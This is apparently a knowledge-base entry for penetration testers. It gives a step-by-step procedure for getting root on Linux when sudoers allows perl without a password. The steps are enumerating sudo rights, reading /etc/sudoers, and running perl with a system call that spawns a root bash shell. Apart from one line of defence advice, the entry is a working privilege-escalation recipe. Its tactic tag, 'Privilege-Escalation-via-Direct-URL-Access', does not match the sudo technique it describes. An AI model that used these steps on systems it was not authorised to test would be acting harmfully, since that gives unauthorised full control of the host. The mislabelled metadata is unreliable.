---
id: 25502c3e-2167-46e3-8658-b7f2498f4379
type: procedure
verified: true
submitted: true
created_at: '2019-11-23T01:30:50.531954+00:00'
updated_at: '2023-05-26T00:52:34.166380+00:00'
tactics:
  - '[[Privilege-Escalation-via-Direct-URL-Access]]'
techniques:
  - '[[Sudo and Sudo Caching]]'
sub_techniques: []
tags:
  - privileges
  - service-attacks
  - linux
commands:
  - '[[commands/list-sudo-privileges]]'
  - '[[commands/view-sudoers-configuration]]'
  - '[[commands/perl-spawn-root-shell-using-sudo]]'
platforms:
  - Linux
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Spawn Root Shell Using Sudo Perl

## Summary

This procedure exploits sudo misconfiguration allowing perl execution as root to spawn a privileged shell, escalating from user to root access.

## Description

If sudoers permits (ALL) NOPASSWD: /usr/bin/perl, attackers can inject system calls via perl's -e flag. This bypasses restrictions for full system control.

## Requirements

1. Local user access on target
2. Sudo privileges on perl
3. Perl installed (standard on Linux)

## Defense

Restrict sudo to specific commands, audit sudoers regularly, and use tools like sudo-logs for monitoring.

## Objectives

1. Verify sudo permissions
2. Confirm perl allowance
3. Escalate to root shell

## Instructions

### Step 1: List Sudo Privileges

**Context**: Check what commands the user can run with sudo.

**Command** ([[commands/list-sudo-privileges]]):
```bash
sudo -l
```

> Look for (ALL) NOPASSWD: /usr/bin/perl.

### Step 2: View Sudoers for Confirmation

**Context**: Inspect configuration if accessible.

**Command** ([[commands/view-sudoers-configuration]]):
```bash
cat /etc/sudoers
```

> Verify perl entry; if not root, may need escalation path.

### Step 3: Spawn Root Shell with Perl

**Context**: Use perl to execute bash as root.

**Command** ([[commands/perl-spawn-root-shell-using-sudo]]):
```bash
sudo /usr/bin/perl -e 'system("/bin/bash")'
```

> Prompt changes to root; run id to confirm.
